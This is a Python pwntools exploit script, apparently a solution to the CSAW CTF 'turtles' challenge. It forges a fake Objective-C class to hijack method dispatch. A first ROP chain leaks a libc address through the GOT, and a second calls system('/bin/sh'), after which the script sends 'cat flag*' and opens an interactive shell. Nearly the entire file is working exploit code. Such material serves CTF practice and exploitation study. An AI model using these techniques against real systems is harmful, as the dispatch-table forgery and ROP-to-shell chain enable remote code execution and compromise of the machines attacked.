#!/usr/bin/env python
import os
#
from pwn import context, remote, process, log, p64, u64, args, pause, gdb
from pwn import ELF, ROP
context.clear(arch='amd64', os='linux')


HERE_DIR = os.path.dirname(os.path.abspath(__file__))


class Attack:
    def __init__(self, host, port, elf_name, libc_name=None, lib_path=None, ld_linux_name=None, gdb_script=None):
        self.host, self.port = host, port
        self.elf_name, self.libc_name = elf_name, libc_name
        self.lib_path = lib_path
        self.ld_linux_name = ld_linux_name
        self.gdb_script = gdb_script

        self.elf = ELF(self.elf_name)

        if libc_name:
            self.libc = ELF(self.libc_name)

        self.p = None


    def get_process(self, ld_preload=False, ld_linux=False):
        p = None
        if args.REMOTE:
            p = remote(self.host, self.port)
        else:
            env = {}
            if self.lib_path:
                env['LD_LIBRARY_PATH'] = self.lib_path
            if ld_preload:
                env['LD_PRELOAD'] = self.libc_name

            argv = []
            if ld_linux:
                argv.append(self.ld_linux_name)

            argv.append(self.elf_name)
            p = process(argv, env=env)
            if args.GDB:
                gdb.attach(p.pid, self.gdb_script)
        return p


    def get_turtle_address(self):
        self.p.recvuntil('Turtle: 0x')
        leak = self.p.recvline(keepends=False)
        return int(leak, 16)


    @staticmethod
    def create_fake_turtle(ADDR_turtle, rop_chain, data, sel_id):
        OFFSET_objc_class__dtable = 0x40
        OFFSET_objc_class__instance_size = 40

        # ROP, use command "ROPgadget --binary turtles"
        GADGET_pop4_ret = 0x400d3c  # pop r12; pop r13; pop r14; pop r15; ret;

        base_vtable = 0x90
        base_data = 0x80
        ADDR_class_pointer = ADDR_turtle + base_vtable

        buf = (
            p64(ADDR_class_pointer - OFFSET_objc_class__dtable),  # class_pointer
            rop_chain.ljust(base_data - 8, '\x00'),
            # OFFSET 0x80
            data.ljust(base_vtable - base_data, '\x00'),
            # OFFSET 0x90
            p64(ADDR_class_pointer + 0x08),  # jump to rop_chain above, this originally points to [turtle say]
            p64(ADDR_class_pointer + 0x10 - (sel_id & 0xffffffff) * 8),  # tbl_level1
            p64(ADDR_class_pointer + 0x18 - (sel_id >> 32) * 8),  # tbl_level2
            p64(GADGET_pop4_ret)
        )

        MEMCPY_SIZE = 200
        buf = ''.join(buf).ljust(MEMCPY_SIZE, 'A')
        return buf


    def exploit(self):
        elf = self.elf
        libc = self.libc
        libc.symbols['OneGadget'] = 0x41320
        libc.symbols['/bin/sh'] = 0x001633e8
        base_data = 0x80

        #    (gdb) x/xg 0x00601560
        #    0x601560:       0x0000001500000064
        Turtle_say_sel_id = 0x0000001500000064

        with self.get_process(ld_linux=True) as self.p:

            # -- stage 1 ---------------------------------------------------------------

            ADDR_turtle = self.get_turtle_address()
            log.info('turtle : %s', hex(ADDR_turtle))
            data = '%sEND'
            ADDR_data = ADDR_turtle + base_data

            rop_chain = ROP(elf)
            rop_chain.printf(ADDR_data, elf.got['setvbuf'])
            rop_chain.main()
            log.debug('ROP CHAIN: \n%s', rop_chain.dump())

            payload = Attack.create_fake_turtle(ADDR_turtle, rop_chain.chain(), data, Turtle_say_sel_id)
            assert('\n' not in payload)
            self.p.sendline(payload)

            if args.GDB:
                pause()

            leak = self.p.recvuntil('END', drop=True)
            ADDR_setvbuf = u64(leak.ljust(8, '\x00'))
            libc.address = ADDR_setvbuf - libc.symbols['setvbuf']
            ADDR_bin_sh = libc.symbols['/bin/sh']
            log.info('setvbuf   : %s', hex(ADDR_setvbuf))
            log.info('libc      : %s', hex(libc.address))
            log.info('/bin/sh   : %s', hex(ADDR_bin_sh))

            # -- stage 2 ---------------------------------------------------------------

            if args.GDB:
                pause()

            ADDR_turtle1 = self.get_turtle_address()
            log.info('turtle2   : %s', hex(ADDR_turtle1))
            data = '/bin/sh\x00'
            ADDR_data = ADDR_turtle1 + base_data

            rop_chain2 = ROP(libc)
            rop_chain2.system(ADDR_bin_sh)
            log.debug('ROP CHAIN: \n%s', rop_chain2.dump())

            payload = Attack.create_fake_turtle(ADDR_turtle1, rop_chain2.chain(), data, Turtle_say_sel_id)
            assert('\n' not in payload)
            self.p.sendline(payload)

            self.p.sendline('ls -laF')
            self.p.sendline('cat flag*')
            self.p.interactive()


if __name__ == '__main__':
    host, port = 'pwn.chal.csaw.io', 9003
    elf_name, libc_name  = 'turtles', 'libs/libc.so.6'
    lib_path = 'libs/'
    ld_linux_name = 'ld-2.19.so' # From libc6_2.19-18+deb8u10_amd64.deb

    elf_name = os.path.join(HERE_DIR, elf_name)
    libc_name = os.path.join(HERE_DIR, libc_name)
    lib_path = os.path.join(HERE_DIR, lib_path)
    ld_linux_name = os.path.join(HERE_DIR, ld_linux_name)

    gdb_script = r"""
source ~/peda/peda.py
b *0x00400c85
"""
    attack = Attack(host, port, elf_name, libc_name, lib_path, ld_linux_name, gdb_script)
    attack.exploit()
